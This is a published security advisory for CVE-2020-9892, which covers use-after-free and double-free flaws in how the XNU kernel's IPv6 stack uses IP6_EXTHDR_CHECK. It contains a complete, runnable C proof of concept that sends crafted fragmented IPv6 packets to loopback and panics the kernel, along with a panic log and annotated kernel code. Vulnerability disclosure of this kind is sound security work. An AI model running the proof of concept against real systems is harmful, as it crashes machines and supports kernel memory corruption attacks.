---
title: 'XNU: Multiple IP6_EXTHDR_CHECK Use-After-Free/Double Free Vulnerabilities'
published: '2020-07-27T07:17:53Z'
severity: Moderate
ghsa_id: GHSA-gxcr-cw4q-9q78
cve_id: CVE-2020-9892
weaknesses: []
products:
- ecosystem: ''
  package_name: XNU
  affected_versions: <xnu-6153.141.1~9
  patched_versions: xnu-6153.141.1~9
cvss: null
credits:
- github_user_id: TheOfficialFloW
  name: Andy Nguyen
  avatar: https://avatars.githubusercontent.com/u/14246466?s=40&v=4
---

# XNU: Multiple IP6_EXTHDR_CHECK Use-After-Free/Double Free Vulnerabilities

## Summary

Memory corruption can be achieved by sending fragmented IPv6 packets to loopback interface due to poor and inconsistent use of `IP6_EXTHDR_CHECK`.

## Severity

We deem this vulnerability as medium. While the Proof Of Concept requires root privileges in order to open a `SOCK_RAW` socket to send fragmented packets, these vulnerabilities may also be reachable with user privileges or even from sandbox. It can also be potentially triggered remotely if packets are configured to be forwarded to loopback.

## Proof Of Concept

Attached is a Proof Of Concept which targets the `dest6_input` path. While the provided kernel panics below are from `xnu-6041.0.0.111.5`, we have reverse engineered the latest kernel and verified that all the vulnerabilities are still present.

Panic log:

```
panic(cpu 1 caller 0xffffff800daeac38): "m_free: freeing an already freed mbuf"@/BuildRoot/Library/Caches/com.apple.xbs/Sources/xnu/xnu-6041.0.0.111.5/bsd/kern/uipc_mbuf.c:3793
Backtrace (CPU 1), Frame : Return Address
0xffffff80be07b750 : 0xffffff800d55b12b mach_kernel : _handle_debugger_trap + 0x47b
0xffffff80be07b7a0 : 0xffffff800d690a95 mach_kernel : _kdp_i386_trap + 0x155
0xffffff80be07b7e0 : 0xffffff800d68271b mach_kernel : _kernel_trap + 0x4fb
0xffffff80be07b830 : 0xffffff800d501bb0 mach_kernel : _return_from_trap + 0xe0
0xffffff80be07b850 : 0xffffff800d55a817 mach_kernel : _DebuggerTrapWithState + 0x17
0xffffff80be07b950 : 0xffffff800d55abf6 mach_kernel : _panic_trap_to_debugger + 0x216
0xffffff80be07b9a0 : 0xffffff800dcd2939 mach_kernel : _panic + 0x61
0xffffff80be07ba10 : 0xffffff800daeac38 mach_kernel : _m_retryhdr + 0x3f8
0xffffff80be07ba30 : 0xffffff800d9c8248 mach_kernel : _icmp6_input + 0xe8
0xffffff80be07bb60 : 0xffffff800d9dae69 mach_kernel : _ip6_input + 0xfd9
0xffffff80be07bcf0 : 0xffffff800d9d9dbd mach_kernel : _ip6_init + 0x76d
0xffffff80be07bd30 : 0xffffff800d868e85 mach_kernel : _proto_input + 0xd5
0xffffff80be07bd60 : 0xffffff800d830dc9 mach_kernel : _loopattach + 0xc89
0xffffff80be07bd80 : 0xffffff800d8220f6 mach_kernel : _ifnet_notify_data_threshold + 0x1646
0xffffff80be07bdb0 : 0xffffff800d821d91 mach_kernel : _ifnet_notify_data_threshold + 0x12e1
0xffffff80be07bf40 : 0xffffff800d82231e mach_kernel : _ifnet_datamov_end + 0x1fe
0xffffff80be07bfa0 : 0xffffff800d50113e mach_kernel : _call_continuation + 0x2e
```

Run this code as root:

```c
#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/if_var.h>
#include <netinet/ip6.h>

struct packet1 {
  struct ip6_hbh hbh;
  struct ip6_opt hbh_opt;
  uint8_t hbh_pad[4];
  struct ip6_frag frag;
  struct ip6_dest dest;
  struct ip6_opt dest_opt;
  uint8_t dest_pad[4];
};

struct packet2 {
  struct ip6_hbh hbh;
  struct ip6_opt hbh_opt;
  uint8_t hbh_pad[4];
  struct ip6_frag frag;
  struct ip6_opt dest_opt;
  uint8_t dest_pad[6];
  uint8_t payload[16];
};

int main(int argc, char *argv[]) {
  struct sockaddr_in6 daddr;
  struct packet1 packet1;
  struct packet2 packet2;
  int s, id, res;

  srand(time(NULL));
  id = rand();

  s = socket(AF_INET6, SOCK_RAW, IPPROTO_HOPOPTS);
  if (s < 0) {
    perror("socket");
    return 1;
  }

  memset(&daddr, 0, sizeof(daddr));
  daddr.sin6_family = AF_INET6;
  daddr.sin6_port = 0;
  inet_pton(AF_INET6, "::1", &daddr.sin6_addr);

  memset(&packet1, 'A', sizeof(struct packet1));
  packet1.hbh.ip6h_nxt = IPPROTO_FRAGMENT;
  packet1.hbh.ip6h_len = 0;
  packet1.hbh_opt.ip6o_type = IP6OPT_PADN;
  packet1.hbh_opt.ip6o_len = 4;
  packet1.frag.ip6f_nxt = IPPROTO_DSTOPTS;
  packet1.frag.ip6f_reserved = 0;
  packet1.frag.ip6f_offlg = htons(0) | IP6F_MORE_FRAG;
  packet1.frag.ip6f_ident = id;
  // Use IPPROTO_RAW for "assertion failed: m->m_flags & M_PKTHDR" panic
  // Use IPPROTO_ICMPV6 for "m_free: freeing an already freed mbuf" panic
  packet1.dest.ip6d_nxt = IPPROTO_ICMPV6;
  packet1.dest.ip6d_len = 1;
  packet1.dest_opt.ip6o_type = IP6OPT_PADN;
  packet1.dest_opt.ip6o_len = 4;

  memset(&packet2, 'B', sizeof(struct packet2));
  packet2.hbh.ip6h_nxt = IPPROTO_FRAGMENT;
  packet2.hbh.ip6h_len = 0;
  packet2.hbh_opt.ip6o_type = IP6OPT_PADN;
  packet2.hbh_opt.ip6o_len = 4;
  packet2.frag.ip6f_nxt = IPPROTO_DSTOPTS;
  packet2.frag.ip6f_reserved = 0;
  packet2.frag.ip6f_offlg = htons(8);
  packet2.frag.ip6f_ident = id;
  packet2.dest_opt.ip6o_type = IP6OPT_PADN;
  packet2.dest_opt.ip6o_len = 6;

  res = sendto(s, (char *)&packet1, sizeof(packet1), 0,
               (struct sockaddr *)&daddr, (socklen_t)sizeof(daddr));
  if (res < 0) {
    perror("sendto");
    return 1;
  }

  res = sendto(s, (char *)&packet2, sizeof(packet2), 0,
               (struct sockaddr *)&daddr, (socklen_t)sizeof(daddr));
  if (res < 0) {
    perror("sendto");
    return 1;
  }

  close(s);
  return 0;
}
```

## Analysis

*All code snippets are taken from latest `xnu-6153.11.26`.*

### Background

The macro `IP6_EXTHDR_CHECK` ensures that region between the IP6 header and the target header are continuous.

```c
#define IP6_EXTHDR_CHECK(m, off, hlen, action)                          \
do {                                                                    \
    if ((m)->m_next != NULL) {                                          \
	if (((m)->m_flags & M_LOOP) &&                                  \
	    ((m)->m_len < (off) + (hlen)) &&                            \
	    (((m) = m_pullup((m), (off) + (hlen))) == NULL)) {          \
	        ip6stat.ip6s_exthdrtoolong++;                           \
	        action;                                                 \
	} else if ((m)->m_flags & M_EXT) {                              \
	        if ((m)->m_len < (off) + (hlen)) {                      \
	                ip6stat.ip6s_exthdrtoolong++;                   \
	                m_freem(m);                                     \
	                (m) = NULL;                                     \
	                action;                                         \
	        }                                                       \
	} else {                                                        \
	...
    }                                                                   \
} while (0)
```

A remote packet is dropped if there is not enough space available. However, for a packet received from loopback, it calls `m_pullup` and attempts to rearrange the mbuf chain, such that data from `0` to `off+hlen` is contained in a single mbuf.

```c
struct mbuf *
m_pullup(struct mbuf *n, int len)
{
	...
	if ((n->m_flags & M_EXT) == 0 &&
		...
	} else {
		if (len > MHLEN) {
			goto bad;
		}
		_MGET(m, M_DONTWAIT, n->m_type);
		if (m == 0) {
			goto bad;
		}
		m->m_len = 0;
		if (n->m_flags & M_PKTHDR) {
			M_COPY_PKTHDR(m, n);
			n->m_flags &= ~M_PKTHDR;
		}
	}
	space = &m->m_dat[MLEN] - (m->m_data + m->m_len);
	do {
		...
		if (n->m_len != 0) {
			n->m_data += count;
		} else {
			n = m_free(n);
		}
	} while (len > 0 && n != NULL);
	if (len > 0) {
		(void) m_free(m);
		goto bad;
	}
	m->m_next = n;
	return m;
bad:
	m_freem(n);
	MPFail++;
	return 0;
}
```

If `m_pullup` succeeds, nodes of the mbuf chain that cover the `len` bytes **are free'd** and the new head of the mbuf is returned. Then, it is assigned to `m` in `IP6_EXTHDR_CHECK`.

### Vulnerabilities

Unfortunately, the use of `IP6_EXTHDR_CHECK` is very poor and inconsistent. There exist **10 different subroutines** spread across the ipv6 network subsystem which do not take into consideration that some nodes of the mbuf may have been free'd.

- In these 2 subroutines, we may trigger a *Double Free*:
  - dest6_input
  - route6_input
- In these 4 subroutines, we may trigger a *Write-After-Free*:
  - frag6_input
  - icmp6_redirect_input
  - nd6_na_input
  - nd6_ns_input
- In these 4 subroutines, we may trigger a *Read-After-Free*:
  - ah6_input
  - mld_input
  - nd6_ra_input
  - nd6_rs_input

#### Triggering m_free

In order to free nodes of the mbuf chain, the following conditions must hold true:

- `m_flags` must have `M_LOOP` set: this can be achieved by sending a packet to loopback device.
- The packet, especially its extension header, must be split across multiple mbufs: this can be achieved by **sending fragmented packets**. `frag6_input` will then link the nodes using `t->m_next = IP6_REASS_MBUF(af6);`.
- The mbuf must not use its internal data but rather an attached mbuf cluster. This seems to be the default behavior.
- The offset of the split header plus its size must not exceed `MHLEN`.

### Reachability

While the Proof Of Concept requires root privileges in order to open a `SOCK_RAW` socket to send fragmented packets, these vulnerabilities may also be reachable with user privileges or even from sandbox. We spent a bit of time investigating the **possibility of a remote attack**. Indeed, if a user configures his ipfw to redirect/forward to loopback, it may be possible to trigger them as well.

### Case Studies

Below, code snippets of the corresponding vulnerabilities are shown. Important lines are annotated with [X], however without comments since the mistakes should be obvious.

#### Double Free

In the following two subroutines, a double pointer `mp` is passed, but `*mp` is **not updated** after `IP6_EXTHDR_CHECK`. These are parsers of extension headers, and hence they can be followed by yet another target parser which can free `m` once again, thus leading to a double free. Moreover, since `m_pullup` removes the flag `M_PKTHDR`, we essentially have a **Type Confusion**. It may be possible to dereference untrusted pointers of `struct pkthdr`.

##### dest6_input

```c
int
dest6_input(struct mbuf **mp, int *offp, int proto)
{
	struct mbuf *m = *mp;
	...
	IP6_EXTHDR_CHECK(m, off, sizeof(*dstopts), return IPPROTO_DONE);	[1]
	...
	*offp = off;
	return dstopts->ip6d_nxt;
}
```

##### route6_input

```c
int
route6_input(struct mbuf **mp, int *offp, int proto)
{
	struct mbuf *m = *mp;
	...
	IP6_EXTHDR_CHECK(m, off, sizeof(*rh), return IPPROTO_DONE);		[1]
	...
	*offp += rhlen;
	return rh->ip6r_nxt;
}
```

#### Write-After-Free

In the following four subroutines, the content of the stale mbuf can be modified by `in6_setscope` or by directly writing to `s6_addr16[1]`. By racing with an other thread that sprays mbuf's, it may be possible to reclaim the mbuf and corrupt data.

```c
int
in6_setscope(struct in6_addr *in6, struct ifnet *ifp, u_int32_t *ret_id)
{
	...
	if (IN6_IS_SCOPE_LINKLOCAL(in6) || IN6_IS_ADDR_MC_INTFACELOCAL(in6)) {
		in6->s6_addr16[1] = htons(zoneid & 0xffff); /* XXX */
	}
	return 0;
}
```

##### frag6_input

```c
int
frag6_input(struct mbuf **mp, int *offp, int proto)
{
	...
	ip6 = mtod(m, struct ip6_hdr *);					[1]
	IP6_EXTHDR_CHECK(m, offset, sizeof(struct ip6_frag), goto done);	[2]
	ip6f = (struct ip6_frag *)((caddr_t)ip6 + offset);			[3]
	...
	if (ip6f->ip6f_nxt == IPPROTO_UDP &&					[4]
	    ...) {
		...
		if (start != offset || trailer != 0) {
			uint16_t s = 0, d = 0;

			if (IN6_IS_SCOPE_EMBED(&ip6->ip6_src)) {
				s = ip6->ip6_src.s6_addr16[1];
				ip6->ip6_src.s6_addr16[1] = 0;			[5]
			}
			...
		}
		...
	}
	...
}
```

##### icmp6_redirect_input

```c
void
icmp6_redirect_input(struct mbuf *m, int off)
{
	...
	ip6 = mtod(m, struct ip6_hdr *);					[1]
	...
	IP6_EXTHDR_CHECK(m, off, icmp6len, return );				[2]
	nd_rd = (struct nd_redirect *)((caddr_t)ip6 + off);			[3]

	redtgt6 = nd_rd->nd_rd_target;
	reddst6 = nd_rd->nd_rd_dst;

	if (in6_setscope(&redtgt6, m->m_pkthdr.rcvif, NULL) ||			[4]
	    in6_setscope(&reddst6, m->m_pkthdr.rcvif, NULL)) {
		goto freeit;
	}
	...
}
```

##### nd6_na_input

```c
void
nd6_na_input(struct mbuf *m, int off, int icmp6len)
{
	...
	struct ip6_hdr *ip6 = mtod(m, struct ip6_hdr *);			[1]
	...
	IP6_EXTHDR_CHECK(m, off, icmp6len, return );				[2]
	nd_na = (struct nd_neighbor_advert *)((caddr_t)ip6 + off);		[3]
	m->m_pkthdr.pkt_flags |= PKTF_INET6_RESOLVE;

	flags = nd_na->nd_na_flags_reserved;
	is_router = ((flags & ND_NA_FLAG_ROUTER) != 0);
	is_solicited = ((flags & ND_NA_FLAG_SOLICITED) != 0);
	is_override = ((flags & ND_NA_FLAG_OVERRIDE) != 0);

	taddr6 = nd_na->nd_na_target;
	if (in6_setscope(&taddr6, ifp, NULL)) {					[4]
		goto bad;       /* XXX: impossible */
	}
	...
}
```

##### nd6_ns_input

```c
void
nd6_ns_input(
	struct mbuf *m,
	int off,
	int icmp6len)
{
	...
	struct ip6_hdr *ip6 = mtod(m, struct ip6_hdr *);			[1]
	...
	IP6_EXTHDR_CHECK(m, off, icmp6len, return );				[2]
	nd_ns = (struct nd_neighbor_solicit *)((caddr_t)ip6 + off);		[3]
	m->m_pkthdr.pkt_flags |= PKTF_INET6_RESOLVE;

	ip6 = mtod(m, struct ip6_hdr *); /* adjust pointer for safety */
	taddr6 = nd_ns->nd_ns_target;
	if (in6_setscope(&taddr6, ifp, NULL) != 0) {				[4]
		goto bad;
	}
	...
}
```

#### Read-After-Free

In the following four subroutines, no write to the mbuf, i.e. memory corruption, has been identified. Yet, it may be possible to leak kernel memory.

##### ah6_input

```c
int
ah6_input(struct mbuf **mp, int *offp, int proto)
{
	...
	IP6_EXTHDR_CHECK(m, off, sizeof(struct ah), {return IPPROTO_DONE;});	[1]
	ah = (struct ah *)(void *)(mtod(m, caddr_t) + off);			[2]
	...
	{
		...
		IP6_EXTHDR_CHECK(m, off, sizeof(struct ah) + sizoff + siz1,	[3]
		    {return IPPROTO_DONE;});
	}
	...
	if ((sav->flags & SADB_X_EXT_OLD) == 0 && sav->replay[0] != NULL) {
		if (ipsec_updatereplay(ntohl(((struct newah *)ah)->ah_seq), sav, 0)) {	[4]
			IPSEC_STAT_INCREMENT(ipsec6stat.in_ahreplay);
			goto fail;
		}
	}
	...
}
```

##### mld_input

```c
int
mld_input(struct mbuf *m, int off, int icmp6len)
{
	...
	ip6 = mtod(m, struct ip6_hdr *);					[1]
	IP6_EXTHDR_CHECK(m, off, mldlen, return IPPROTO_DONE);			[2]
	IP6_EXTHDR_GET(mld, struct mld_hdr *, m, off, mldlen);			[3]
	if (mld == NULL) {
		icmp6stat.icp6s_badlen++;
		return IPPROTO_DONE;
	}
	...
	switch (mld->mld_type) {
	case MLD_LISTENER_QUERY:
		icmp6_ifstat_inc(ifp, ifs6_in_mldquery);
		if (icmp6len == sizeof(struct mld_hdr)) {
			if (mld_v1_input_query(ifp, ip6, mld) != 0) {		[4]
				return 0;
			}
		}
		...
		break;
	...
	}

	return 0;

}
```

##### nd6_ra_input

```c
void
nd6_ra_input(
	struct  mbuf *m,
	int off,
	int icmp6len)
{
	...
	struct ip6_hdr *ip6 = mtod(m, struct ip6_hdr *);			[1]
	...
	IP6_EXTHDR_CHECK(m, off, icmp6len, return );				[2]
	nd_ra = (struct nd_router_advert *)((caddr_t)ip6 + off);		[3]
	...
}
```

##### nd6_rs_input

```c
void
nd6_rs_input(
	struct  mbuf *m,
	int off,
	int icmp6len)
{
	...
	struct ip6_hdr *ip6 = mtod(m, struct ip6_hdr *);			[1]
	...
	IP6_EXTHDR_CHECK(m, off, icmp6len, return );				[2]
	nd_rs = (struct nd_router_solicit *)((caddr_t)ip6 + off);		[3]
	...
}
```